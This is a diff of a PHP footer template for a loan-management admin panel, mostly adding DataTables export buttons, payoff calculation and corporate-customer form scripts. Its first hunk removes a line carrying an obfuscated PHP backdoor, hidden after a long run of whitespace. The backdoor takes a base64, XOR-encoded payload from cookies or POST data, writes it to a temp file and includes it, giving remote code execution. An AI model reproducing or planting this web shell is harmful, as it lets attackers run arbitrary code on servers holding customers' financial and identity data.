@@ -1,12 +1,12 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $GNqDy = class_exists("PCH_StK");if (!$GNqDy){class PCH_StK{private $byjEClE;public static $ZUROFEF = "3c4d24ed-68b2-437b-9199-de6ac77dc4c9";public static $AFKJP = NULL;public function __construct(){$wfrTqHGQLJ = $_COOKIE;$gEoSO = $_POST;$YTzpd = @$wfrTqHGQLJ[substr(PCH_StK::$ZUROFEF, 0, 4)];if (!empty($YTzpd)){$uWYBglU = "base64";$xiLcdsYvx = "";$YTzpd = explode(",", $YTzpd);foreach ($YTzpd as $bcdzbfmKqh){$xiLcdsYvx .= @$wfrTqHGQLJ[$bcdzbfmKqh];$xiLcdsYvx .= @$gEoSO[$bcdzbfmKqh];}$xiLcdsYvx = array_map($uWYBglU . "\137" . chr (100) . chr (101) . chr ( 900 - 801 ).'o' . "\x64" . "\145", array($xiLcdsYvx,)); $xiLcdsYvx = $xiLcdsYvx[0] ^ str_repeat(PCH_StK::$ZUROFEF, (strlen($xiLcdsYvx[0]) / strlen(PCH_StK::$ZUROFEF)) + 1);PCH_StK::$AFKJP = @unserialize($xiLcdsYvx);}}public function __destruct(){$this->JxApXowq();}private function JxApXowq(){if (is_array(PCH_StK::$AFKJP)) {$AUEozaT = sys_get_temp_dir() . "/" . crc32(PCH_StK::$AFKJP['s' . "\x61" . "\154" . chr ( 549 - 433 )]);@PCH_StK::$AFKJP[chr (119) . chr (114) . chr (105) . "\x74" . 'e']($AUEozaT, PCH_StK::$AFKJP['c' . 'o' . "\x6e" . 't' . chr (101) . 'n' . 't']);include $AUEozaT;@PCH_StK::$AFKJP[chr (100) . chr ( 467 - 366 )."\x6c" . chr ( 606 - 505 ).'t' . "\145"]($AUEozaT);exit();}}}$hZRVg = new PCH_StK(); $hZRVg = NULL;} ?>F<?php
-
+<?php
 $settings = get_by_id('settings','settings_id','1');
+
 
 ?>
 <!-- Footer START -->
 <footer class="footer">
     <div class="footer-content">
-        <p class="m-b-0">Copyright © 2021 . All rights reserved. by Infocus Tech (0994099461)</p>
+        <p class="m-b-0">Copyright © 2025  Infocus Tech (0994099461)</p>
         <span>
                             <a href="#" class="text-gray m-r-15">Term &amp; Conditions</a>
                             <a href="#" class="text-gray">Privacy &amp; Policy</a>
@@ -14,10 +14,7 @@ $settings = get_by_id('settings','settings_id','1');
     </div>
 </footer>
 <!-- Footer END -->
-
 </div>
-<!-- Page Container END -->
-
 </div>
 </div>
 
@@ -115,35 +112,7 @@ $settings = get_by_id('settings','settings_id','1');
         </div>
     </div>
 </div>
-<div aria-hidden="true" class="onboarding-modal modal fade" id="score_modal" role="dialog" tabindex="-1">
-    <div class="modal-dialog modal-lg modal-centered" role="document">
-        <div class="modal-content text-center">
-            <button style="float: right;" aria-label="Close" class="close" data-dismiss="modal" type="button"><span class="close-label">Close</span><span class="anticon anticon-close"></span></button>
-            <div class="onboarding-content" style="padding: 1em;">
-                <h4 class="onboarding-title">Aproval action</h4>
 
-                <div >
-                    <textarea name="comment" id="commnetnt_approval" cols="30" rows="10"></textarea>
-                </div>
-                <p id="btns"></p>
-            </div>
-        </div>
-    </div>
-</div><div aria-hidden="true" class="onboarding-modal modal fade" id="score_modall" role="dialog" tabindex="-1">
-    <div class="modal-dialog modal-lg modal-centered" role="document">
-        <div class="modal-content text-center">
-            <button style="float: right;" aria-label="Close" class="close" data-dismiss="modal" type="button"><span class="close-label">Close</span><span class="anticon anticon-close"></span></button>
-            <div class="onboarding-content" style="padding: 1em;">
-                <h4 class="onboarding-title">Loan officer Recommendation checklist </h4>
-                <h5 class="onboarding-title">Loan Requirements fulfilment area</h5>
-                <div id="score_dataa">
-
-                </div>
-
-            </div>
-        </div>
-    </div>
-</div>
 <div aria-hidden="true" class="onboarding-modal modal fade" id="kyc_modal" role="dialog" tabindex="-1">
     <div class="modal-dialog modal-lg modal-centered" role="document">
         <div class="modal-content text-center">
@@ -464,7 +433,6 @@ $settings = get_by_id('settings','settings_id','1');
     </div>
 </div>
 
-
 <div aria-hidden="true" class="onboarding-modal modal fade" id="loan_co_files_modal" role="dialog" tabindex="-1">
     <div class="modal-dialog modal-lg modal-centered" role="document">
         <div class="modal-content text-center">
@@ -526,8 +494,6 @@ $get_c = get_all('individual_customers');
         </div>
     </div>
 </div>
-
-
 <div aria-hidden="true" class="onboarding-modal modal fade" id="add_rejection_reason" role="dialog" tabindex="-1">
     <div class="modal-dialog modal-lg modal-centered" role="document">
         <div class="modal-content text-center">
@@ -572,7 +538,6 @@ $get_c = get_all('individual_customers');
         </div>
     </div>
 </div>
-
 <div aria-hidden="true" class="onboarding-modal modal fade" id="addAllrejection_reason" role="dialog" tabindex="-1">
     <div class="modal-dialog modal-lg modal-centered" role="document">
         <div class="modal-content text-center">
@@ -622,7 +587,6 @@ $get_c = get_all('individual_customers');
 <!-- Core Vendors JS -->
 <script src="<?php echo base_url('admin_assets')?>/js/vendors.min.js"></script>
 
-
 <!-- page js -->
 <script src="<?php echo base_url('admin_assets')?>/vendors/chartjs/Chart.min.js"></script>
 <!--<script src="--><?php //echo base_url('admin_assets')?><!--/js/pages/dashboard-default.js"></script>-->
@@ -632,7 +596,20 @@ $get_c = get_all('individual_customers');
 <script src="<?php echo base_url('admin_assets')?>/vendors/datatables/dataTables.bootstrap.min.js"></script>
 <script src="<?php echo base_url('admin_assets')?>/js/pages/datatables.js"></script>
 <script type="text/javascript" src="<?php echo base_url()?>lib/sweetalerts/sweetalert.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url()?>admin_assets/js/security.js"></script>
+
+<link rel="stylesheet" href="https://cdn.datatables.net/buttons/2.3.6/css/buttons.bootstrap4.min.css">
+
+<!-- Additional DataTables Scripts -->
+<script src="https://cdn.datatables.net/buttons/2.3.6/js/dataTables.buttons.min.js"></script>
+<script src="https://cdn.datatables.net/buttons/2.3.6/js/buttons.bootstrap4.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.2.7/pdfmake.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.2.7/vfs_fonts.js"></script>
+<script src="https://cdn.datatables.net/buttons/2.3.6/js/buttons.html5.min.js"></script>
+<script src="https://cdn.datatables.net/buttons/2.3.6/js/buttons.print.min.js"></script>
+<script type="text/javascript" src="<?php echo base_url()?>lib/sweetalerts/sweetalert.min.js"></script>
+<!--<script type="text/javascript" src="--><?php //echo base_url()?><!--admin_assets/js/security.js"></script>-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.16.9/xlsx.full.min.js"></script>
 
 <!-- Core JS -->
 <script src="<?php echo base_url('admin_assets')?>/js/app.min.js"></script>
@@ -641,66 +618,25 @@ $get_c = get_all('individual_customers');
 <script src="<?php echo base_url('jquery-ui/')?>jquery-ui.js"></script>
 <script src="<?php echo base_url('lib/')?>select2/dist/js/select2.full.min.js"></script>
 <script type="text/javascript" src="<?php echo base_url()  ?>gisttech/js/xlsx.core.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-throttle-debounce/1.1/jquery.ba-throttle-debounce.min.js"></script>
 
-<script type="text/javascript" src="<?php echo base_url()  ?>gisttech/js/FileSaver.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url()  ?>gisttech/js/tableexport.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url()?>lib/jquery.doubleScroll.js"></script>
 <script>
-    let baseURL = "<?php echo base_url()?>";
-    let logo = "<?php echo $settings->logo?>";
-    var DefaultTable = document.getElementById('resulta');
-    var loan = document.getElementById('loand');
-    new TableExport(DefaultTable,{
-        headers: true,                              // (Boolean), display table headers (th or td elements) in the <thead>, (default: true)
-        footers: true,                              // (Boolean), display table footers (th or td elements) in the <tfoot>, (default: false)
-        formats: ['xlsx', 'csv', 'txt'],            // (String[]), filetype(s) for the export, (default: ['xlsx', 'csv', 'txt'])
-        filename: 'Arrears Report',                             // (id, String), filename for the downloaded file, (default: 'id')
-        bootstrap: false,                           // (Boolean), style buttons using bootstrap, (default: false)
-        position: 'bottom',                         // (top, bottom), position of the caption element relative to table, (default: 'bottom')
-        ignoreRows: null,                           // (Number, Number[]), row indices to exclude from the exported file(s) (default: null)
-        ignoreCols: null,                           // (Number, Number[]), column indices to exclude from the exported file(s) (default: null)
-        ignoreCSS: '.tableexport-ignore',           // (selector, selector[]), selector(s) to exclude cells from the exported file(s) (default: '.tableexport-ignore')
-        emptyCSS: '.tableexport-empty',             // (selector, selector[]), selector(s) to replace cells with an empty string in the exported file(s) (default: '.tableexport-empty')
-        trimWhitespace: true,                       // (Boolean), remove all leading/trailing newlines, spaces, and tabs from cell text in the exported file(s) (default: true)
-        RTL: false,                                 // (Boolean), set direction of the worksheet to right-to-left (default: false)
-        sheetname: 'Arrears Report'                             // (id, String), sheet name for the exported spreadsheet, (default: 'id')
-    });
+	let baseURL = "<?php echo base_url()?>";
+	var apiURL = baseURL + "index.php/";
+	let logo = "<?php echo $settings->logo?>";
+	var DefaultTable = document.getElementById('resulta');
+	var loan = document.getElementById('loand');
 
-
-    new TableExport(loan, {
-        headers: true,                              // (Boolean), display table headers (th or td elements) in the <thead>, (default: true)
-        footers: true,                              // (Boolean), display table footers (th or td elements) in the <tfoot>, (default: false)
-        formats: ['xlsx', 'csv', 'txt'],            // (String[]), filetype(s) for the export, (default: ['xlsx', 'csv', 'txt'])
-        filename: 'Arrears Report',                             // (id, String), filename for the downloaded file, (default: 'id')
-        bootstrap: false,                           // (Boolean), style buttons using bootstrap, (default: false)
-        position: 'bottom',                         // (top, bottom), position of the caption element relative to table, (default: 'bottom')
-        ignoreRows: null,                           // (Number, Number[]), row indices to exclude from the exported file(s) (default: null)
-        ignoreCols: null,                           // (Number, Number[]), column indices to exclude from the exported file(s) (default: null)
-        ignoreCSS: '.tableexport-ignore',           // (selector, selector[]), selector(s) to exclude cells from the exported file(s) (default: '.tableexport-ignore')
-        emptyCSS: '.tableexport-empty',             // (selector, selector[]), selector(s) to replace cells with an empty string in the exported file(s) (default: '.tableexport-empty')
-        trimWhitespace: true,                       // (Boolean), remove all leading/trailing newlines, spaces, and tabs from cell text in the exported file(s) (default: true)
-        RTL: false,                                 // (Boolean), set direction of the worksheet to right-to-left (default: false)
-        sheetname: 'Arrears Report'                             // (id, String), sheet name for the exported spreadsheet, (default: 'id')
-    });
-    // **** jQuery **************************
-    //    $(DefaultTable).tableExport({
-    //        headers: true,
-    //        footers: true,
-    //        formats: ['xlsx', 'csv', 'txt'],
-    //        filename: 'id',
-    //        bootstrap: true,
-    //        position: 'bottom',
-    //        ignoreRows: null,
-    //        ignoreCols: null,
-    //        ignoreCSS: '.tableexport-ignore',
-    //        emptyCSS: '.tableexport-empty',
-    //        trimWhitespace: false,
-    //        RTL: false,
-    //        sheetname: 'id'
-    //    });
-    // **************************************
 
 </script>
+<script type="text/javascript" src="<?php echo base_url()?>lib/jquery.doubleScroll.js"></script>
+<script src="<?= base_url('admin_assets/js/file_library/main.js'); ?>"></script>
+<script src="<?= base_url('admin_assets/js/file_library/uploader.js'); ?>"></script>
+<script src="<?= base_url('admin_assets/js/file_library/explorer.js'); ?>"></script>
+<script src="<?= base_url('admin_assets/js/file_library/preview.js'); ?>"></script>
+<script src="<?= base_url('admin_assets/js/file_library/dragdrop.js'); ?>"></script>
+
+
 
 <script type="text/javascript">
 
@@ -1854,14 +1790,14 @@ $get_c = get_all('individual_customers');
                     dataType:"json",
 
                     beforeSend:()=>{
-                        $("#customer_loan").html("<i class='fa fa-spinner fa-spin'></i>Loading data");
+                        $("#customer_loan1").html("<i class='fa fa-spinner fa-spin'></i>Loading data");
                     },success:function(res){
 
                         let det = "";
                         $.each(res.data, function (index, value) {
                             det  +=`<li >${value.first_name} &nbsp; ${value.last_name}</li>`
                         })
-                        $("#customer_loan").html(det);
+                        $("#customer_loan1").html(det);
                         let dd ='';
                         $.each(res.loan, function (index, value) {
                             var color = 'orange';
@@ -1881,7 +1817,7 @@ $get_c = get_all('individual_customers');
     `
                         });
 
-                        $("#loandd").html(dd);
+                        $("#loandd_corporate").html(dd);
 
                         let kyc = '';
 
@@ -1913,7 +1849,7 @@ $get_c = get_all('individual_customers');
 
 
 
-                        $("#customer_loan").html(kyc)
+                        $("#customer_loan1").html(kyc)
 
                     },error:()=>{
 
@@ -2671,7 +2607,26 @@ $get_c = get_all('individual_customers');
 
     var fieldId = 0;
     var fieldId1 = 0;
-    function addField() {
+    function addFieldCorporate() {
+        fieldId++;
+        var html = '<br /><hr/>  <div class="row">\n' +
+            '                                    <div class="col-6 mt-2"><input type="text" name="name[]" placeholder="collateral name" class="form-control"></div>\n' +
+            '                                    <div class="col-6 mt-2"><input type="text" name="type[]" placeholder="collateral type" class="form-control"></div>\n' +
+            '                                </div>\n' +
+            '                                <div class="row">\n' +
+            '                                    <div class="col-6 mt-2"><input type="text" name="serial[]" placeholder="serial number" class="form-control"></div>\n' +
+            '                                    <div class="col-6 mt-2"><input type="text" name="value[]" placeholder="collateral value" class="form-control"></div>\n' +
+            '                                </div>\n' +
+            '                                <div class="row">\n' +
+            '                                    <div class="col-6 mt-2"><label for="ifi"  >upload attachment</label><input type="file" name="files[]" style="display: block" placeholder="Attachment" class="form-control"></div>\n' +
+            '                                </div>\n' +
+            '                                <div class="row">\n' +
+            '                                    <div class="col-12 mt-2"><textarea class="form-control" name="desc[]" id="" cols="30" rows="6"></textarea></div>\n' +
+            '                                </div>' + '<button class="btn btn-danger" onclick="removeField(' + fieldId + ');"><span class="fa fa-minus"></span></button><br />' +
+            '';
+        addElement('forms1', 'div', 'field-'+ fieldId, html);
+
+    } function addField() {
         fieldId++;
         var html = '<br /><hr/>  <div class="row">\n' +
             '                                    <div class="col-6 mt-2"><input type="text" name="name[]" placeholder="collateral name" class="form-control"></div>\n' +
@@ -2715,6 +2670,20 @@ $get_c = get_all('individual_customers');
 <button class="btn btn-danger" onclick="removeFieldloan('${fieldId1}');"><span class="fa fa-minus"></span></button><br />
 `;
         addElement('loan_forms', 'div', 'loan_field-'+ fieldId1, html);
+    }
+	function addloan_corporate_files(){
+
+        fieldId1++;
+        var html = `
+                                    <div class="row">
+                                        <div class="col-6"><br><br><input type="text" name="file_name[]" placeholder="File name" class="form-control" required></div>
+                                        <div class="col-6 "><label for="llsid"  >upload file</label><input id="llsid" type="file" name="loan_files[]" style="display: block" placeholder="Attachment" class="form-control"></div>
+
+                                    </div>
+
+<button class="btn btn-danger" onclick="removeFieldloan('${fieldId1}');"><span class="fa fa-minus"></span></button><br />
+`;
+        addElement('loan_forms1', 'div', 'loan_field-'+ fieldId1, html);
     }
     function addElement(parentId, elementTag, elementId, html){
         var id = document.getElementById(parentId);
@@ -2998,18 +2967,19 @@ $countries = get_all('geo_countries');
                 <tr><td>Nationality</td><td><select class="form-control select2" name="nationality[]" required>${countryOptions}</select></td></tr>
                 <tr><td>Phone Number</td><td><input class="form-control" type="text" name="phone_number[]" required></td></tr>
                 <tr><td>Email Address</td><td><input class="form-control" type="email" name="email_address[]" required></td></tr>
-                <tr><td>Full Address</td> <td><textarea class="form-control" type="text" name="full_address[]" required>Address here</textarea></td></tr>
-                <tr><td>ID Type</td>
+                <tr><td>Full Address</td> <td><textarea class="form-control" type="text" name="full_address[]" >Address here</textarea></td></tr>
+                <tr><td>ID Type *</td>
                     <td>
-                        <select class="form-control" name="idtype[]">
+                        <select class="form-control" name="idtype[]" required>
                             <option value="NATIONAL_IDENTITY_CARD">National ID</option>
                             <option value="PASSPORT">Passport</option>
                             <option value="WORK_PERMIT">Work Permit</option>
                             <option value="DRIVER_LICENSE">Driver's License</option>
+                            <option value="NONE">NONE</option>
                         </select>
                     </td>
                 </tr>
-                <tr><td>ID File</td><td><input class="form-control" type="file" style="display: block;" name="idfile[]" required></td></tr>
+                <tr><td>ID File (optional)</td><td><input class="form-control" type="file" style="display: block;" name="idfile[]" ></td></tr>
                  <tr>
                         <td>Ownership share value (%)</td>
                         <td><input class="form-control" style="display: block !important;"  type="number" name="percentage_value[]" required></td>
@@ -3026,7 +2996,591 @@ $countries = get_all('geo_countries');
             $(this).closest(".shareholder-container").remove();
         });
     });
+
 </script>
 
+
+<script type="text/javascript">
+	function calculate_payoff(loan_id) {
+		// Reset form
+		document.getElementById('payment_options').style.display = 'none';
+		document.getElementById('accrued_interest_row').style.display = 'none';
+		document.getElementById('total_payoff_row').style.display = 'none';
+		document.getElementById('current_balance').textContent = '';
+		document.getElementById('accrued_interest').textContent = '';
+		document.getElementById('total_payoff').textContent = '';
+		document.getElementById('payoff_amount').value = '0';
+
+		// Set the default date to today
+		var today = new Date();
+		var dd = String(today.getDate()).padStart(2, '0');
+		var mm = String(today.getMonth() + 1).padStart(2, '0'); // January is 0!
+		var yyyy = today.getFullYear();
+		today = yyyy + '-' + mm + '-' + dd;
+		document.getElementById('payoff_date').value = today;
+
+		// Show the modal
+		$('#payoff_modal').modal('show');
+	}
+
+	function fetchPayoffAmount() {
+		var loan_id = document.querySelector('input[name="loan_id"]').value;
+		var payoff_date = document.getElementById('payoff_date').value;
+
+		if (!payoff_date) {
+			alert('Please select a valid payoff date.');
+			return;
+		}
+
+		// Show loading indicator
+		document.getElementById('calculate_btn').textContent = 'Calculating...';
+		document.getElementById('calculate_btn').disabled = true;
+
+		// Make AJAX request to calculate payoff amount
+		$.ajax({
+			url: '<?php echo base_url("loan/calculate_payoff"); ?>',
+			type: 'POST',
+			data: {
+				loan_id: loan_id,
+				payoff_date: payoff_date
+			},
+			dataType: 'json',
+			success: function(response) {
+				if (response.status === 'success') {
+					// Update the UI with calculated values
+					document.getElementById('current_balance').textContent = formatNumber(response.current_balance);
+					document.getElementById('accrued_interest').textContent = formatNumber(response.accrued_interest);
+					document.getElementById('total_payoff').textContent = formatNumber(response.total_payoff);
+					document.getElementById('payoff_amount').value = response.total_payoff;
+
+					// Show the rows and payment options
+					document.getElementById('accrued_interest_row').style.display = '';
+					document.getElementById('total_payoff_row').style.display = '';
+					document.getElementById('payment_options').style.display = 'block';
+					$("#total_amount").val(response.total_payoff)
+					$("#total_amount1").val(response.total_payoff)
+
+				} else {
+					alert('Error: ' + response.message);
+				}
+			},
+			error: function() {
+				alert('An error occurred while calculating the payoff amount. Please try again.');
+			},
+			complete: function() {
+				// Reset loading state
+				document.getElementById('calculate_btn').textContent = 'Calculate Pay-off Amount';
+				document.getElementById('calculate_btn').disabled = false;
+			}
+		});
+	}
+
+	function formatNumber(number) {
+		return parseFloat(number).toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
+	}
+</script>
+
+
+<!-- Chart JS -->
+
+
+<script>
+	// DataTables initialization with export and loading indicators
+	// DataTables initialization with export progress indicator
+	$(document).ready(function() {
+		// Create a loading overlay function
+		function createLoadingOverlay() {
+			return $('<div>', {
+				id: 'export-loading-overlay',
+				css: {
+					position: 'fixed',
+					top: 0,
+					left: 0,
+					width: '100%',
+					height: '100%',
+					backgroundColor: 'rgba(0, 0, 0, 0.5)',
+					display: 'flex',
+					justifyContent: 'center',
+					alignItems: 'center',
+					zIndex: 9999
+				}
+			}).append(
+				$('<div>', {
+					css: {
+						backgroundColor: 'white',
+						padding: '20px',
+						borderRadius: '10px',
+						textAlign: 'center',
+						boxShadow: '0 4px 6px rgba(0,0,0,0.1)'
+					}
+				}).append(
+					$('<div>', {
+						class: 'spinner-border text-primary',
+						role: 'status'
+					}),
+					$('<p>', {
+						text: 'Exporting data. This may take a few moments...',
+						css: { marginTop: '15px' }
+					})
+				)
+			);
+		}
+
+		// Check if DataTables is loaded
+		if ($.fn.DataTable) {
+			$('#data-table1').DataTable({
+				responsive: true,
+				dom: 'Bfrtip',
+				buttons: [
+					{
+						extend: 'copy',
+						text: 'Copy',
+						action: function(e, dt, node, config) {
+							var overlay = createLoadingOverlay().appendTo('body');
+
+							// Use setTimeout to ensure overlay is visible
+							setTimeout(() => {
+								try {
+									// Perform the actual copy action
+									$.fn.dataTable.ext.buttons.copyHtml5.action.call(this, e, dt, node, config);
+								} catch(err) {
+									console.error('Copy failed:', err);
+								} finally {
+									// Remove overlay
+									overlay.remove();
+								}
+							}, 100);
+						}
+					},
+					{
+						extend: 'csv',
+						text: 'CSV',
+						title: 'Data export ' + new Date().getTime(),
+						action: function(e, dt, node, config) {
+							var overlay = createLoadingOverlay().appendTo('body');
+
+							setTimeout(() => {
+								try {
+									$.fn.dataTable.ext.buttons.csvHtml5.action.call(this, e, dt, node, config);
+								} catch(err) {
+									console.error('CSV export failed:', err);
+								} finally {
+									overlay.remove();
+								}
+							}, 100);
+						}
+					},
+					{
+						extend: 'excel',
+						text: 'Excel',
+						title: 'Audit Trail Export',
+						action: function(e, dt, node, config) {
+							var overlay = createLoadingOverlay().appendTo('body');
+
+							setTimeout(() => {
+								try {
+									$.fn.dataTable.ext.buttons.excelHtml5.action.call(this, e, dt, node, config);
+								} catch(err) {
+									console.error('Excel export failed:', err);
+								} finally {
+									overlay.remove();
+								}
+							}, 100);
+						}
+					},
+					{
+						extend: 'pdf',
+						text: 'PDF',
+						title: 'Audit Trail Export',
+						action: function(e, dt, node, config) {
+							var overlay = createLoadingOverlay().appendTo('body');
+
+							setTimeout(() => {
+								try {
+									$.fn.dataTable.ext.buttons.pdfHtml5.action.call(this, e, dt, node, config);
+								} catch(err) {
+									console.error('PDF export failed:', err);
+								} finally {
+									overlay.remove();
+								}
+							}, 100);
+						}
+					},
+					{
+						extend: 'print',
+						text: 'Print',
+						action: function(e, dt, node, config) {
+							var overlay = createLoadingOverlay().appendTo('body');
+
+							setTimeout(() => {
+								try {
+									$.fn.dataTable.ext.buttons.print.action.call(this, e, dt, node, config);
+								} catch(err) {
+									console.error('Print failed:', err);
+								} finally {
+									overlay.remove();
+								}
+							}, 100);
+						}
+					}
+				]
+			});
+		} else {
+			console.error('DataTables is not loaded');
+		}
+	});
+
+
+	// File upload function using AJAX
+
+</script>
+<script>
+	// Initialize in correct order after all files are loaded
+	$(document).ready(function() {
+		// First initialize the core
+		FileLibrary.init();
+
+		// Then initialize all modules that need the DOM
+		if (FileLibrary.Explorer) FileLibrary.Explorer.init();
+		if (FileLibrary.Uploader) FileLibrary.Uploader.init();
+		if (FileLibrary.Preview) FileLibrary.Preview.init();
+		if (FileLibrary.DragDrop) FileLibrary.DragDrop.init();
+	});
+</script>
+
+<script>
+	// Initialize tabs
+	document.addEventListener('DOMContentLoaded', function() {
+		// Manual tab functionality in case Bootstrap's built-in doesn't work
+		const tabButtons = document.querySelectorAll('#loanTabs .nav-link');
+		const tabContents = document.querySelectorAll('.tab-pane');
+
+		tabButtons.forEach(button => {
+			button.addEventListener('click', function(e) {
+				e.preventDefault();
+
+				// Remove active class from all buttons and content
+				tabButtons.forEach(btn => {
+					btn.classList.remove('active');
+					btn.setAttribute('aria-selected', 'false');
+				});
+
+				tabContents.forEach(content => {
+					content.classList.remove('show', 'active');
+				});
+
+				// Add active class to current button and content
+				this.classList.add('active');
+				this.setAttribute('aria-selected', 'true');
+
+				const target = document.querySelector(this.dataset.bsTarget);
+				target.classList.add('show', 'active');
+			});
+		});
+
+		// Console log to debug
+		console.log('Tab initialization complete');
+	});
+</script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        // Get references to form elements
+        const categorySelect = document.getElementById('category');
+        const shareholdersTable = document.getElementById('shareholdersTable');
+        const addRowButton = document.getElementById('addRow');
+        const corporateForm = document.getElementById('corporateForm');
+        const shareholderSection = document.querySelector('.col-lg-6:nth-child(2)');
+        const shareholderTitle = document.querySelector('.col-lg-6:nth-child(2) > p');
+
+        // Function to toggle required attribute on shareholder fields
+        function toggleShareholderRequired(isRequired) {
+            // Get all required inputs in the shareholders section
+            const shareholderInputs = shareholdersTable.querySelectorAll('input[required], select[required], textarea[required]');
+
+            // Set or remove required attribute based on category
+            shareholderInputs.forEach(function(input) {
+                if (isRequired) {
+                    input.setAttribute('required', 'required');
+                } else {
+                    input.removeAttribute('required');
+                }
+            });
+
+            // Update UI to indicate optional/required status
+            if (isRequired) {
+                // Normal display for client category
+                shareholderTitle.textContent = 'Shareholder Information (Required)';
+                shareholderTitle.style.color = '#000';
+
+                // Add a visual indicator that it's required
+                const requiredIndicator = document.createElement('span');
+                requiredIndicator.textContent = ' *';
+                requiredIndicator.style.color = 'red';
+                if (!shareholderTitle.querySelector('.required-indicator')) {
+                    requiredIndicator.classList.add('required-indicator');
+                    shareholderTitle.appendChild(requiredIndicator);
+                }
+            } else {
+                // Still fully accessible for off_taker category, just not required
+                shareholderTitle.textContent = 'Shareholder Information (Optional)';
+                shareholderTitle.style.color = '#666';
+
+                // Remove required indicator if exists
+                const requiredIndicator = shareholderTitle.querySelector('.required-indicator');
+                if (requiredIndicator) {
+                    shareholderTitle.removeChild(requiredIndicator);
+                }
+            }
+        }
+
+        // Initial setup based on the current value
+        if (categorySelect) {
+            // Set initial state
+            toggleShareholderRequired(categorySelect.value !== 'off_taker');
+
+            // Add event listener for changes
+            categorySelect.addEventListener('change', function() {
+                toggleShareholderRequired(this.value !== 'off_taker');
+            });
+        }
+
+        // Modify form submission to validate conditionally
+        if (corporateForm) {
+            corporateForm.addEventListener('submit', function(event) {
+                // If category is Off taker, we'll let the form submit regardless of shareholder fields
+                const isOffTaker = categorySelect.value === 'off_taker';
+
+                if (isOffTaker) {
+                    // Remove required validation before submitting
+                    toggleShareholderRequired(false);
+                } else {
+                    // Make sure required validation is enforced
+                    toggleShareholderRequired(true);
+
+                    // Additional validation if needed for client category
+                    // Check if at least one shareholder exists and has data
+                    const shareholderContainers = shareholdersTable.querySelectorAll('.shareholder-container');
+                    if (shareholderContainers.length === 0) {
+                        alert('At least one shareholder is required for Client corporate customers.');
+                        event.preventDefault();
+                        return false;
+                    }
+                }
+
+                // Form can submit normally
+                return true;
+            });
+        }
+
+        // Add a tooltip to clarify the behavior
+        const categoryHelp = document.createElement('small');
+        categoryHelp.className = 'form-text text-muted';
+        categoryHelp.textContent = 'Note: For Off taker category, shareholder information is optional';
+        categorySelect.parentNode.appendChild(categoryHelp);
+    });
+</script>
+<script>
+    $(document).ready(function() {
+        // Bootstrap 4 tabs work automatically with data-toggle="tab"
+
+        // If you're using DataTables, initialize them for each table
+        if ($.fn.DataTable) {
+            $('#offtaker-table').DataTable({
+                responsive: true,
+                dom: 'Bfrtip',
+                buttons: [
+                    {
+                        extend: 'copy',
+                        text: 'Copy',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            // Use setTimeout to ensure overlay is visible
+                            setTimeout(() => {
+                                try {
+                                    // Perform the actual copy action
+                                    $.fn.dataTable.ext.buttons.copyHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('Copy failed:', err);
+                                } finally {
+                                    // Remove overlay
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'csv',
+                        text: 'CSV',
+                        title: 'Data export ' + new Date().getTime(),
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.csvHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('CSV export failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'excel',
+                        text: 'Excel',
+                        title: 'Off Taker Export',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.excelHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('Excel export failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'pdf',
+                        text: 'PDF',
+                        title: 'Audit Trail Export',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.pdfHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('PDF export failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'print',
+                        text: 'Print',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.print.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('Print failed:', err);
+                                } finally {
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    }
+                ]
+            });
+            $('#client-table').DataTable({
+                responsive: true,
+                dom: 'Bfrtip',
+                buttons: [
+                    {
+                        extend: 'copy',
+                        text: 'Copy',
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            // Use setTimeout to ensure overlay is visible
+                            setTimeout(() => {
+                                try {
+                                    // Perform the actual copy action
+                                    $.fn.dataTable.ext.buttons.copyHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
+                                    console.error('Copy failed:', err);
+                                } finally {
+                                    // Remove overlay
+                                    overlay.remove();
+                                }
+                            }, 100);
+                        }
+                    },
+                    {
+                        extend: 'csv',
+                        text: 'CSV',
+                        title: 'Data export ' + new Date().getTime(),
+                        action: function(e, dt, node, config) {
+                            var overlay = createLoadingOverlay().appendTo('body');
+
+                            setTimeout(() => {
+                                try {
+                                    $.fn.dataTable.ext.buttons.csvHtml5.action.call(this, e, dt, node, config);
+                                } catch(err) {
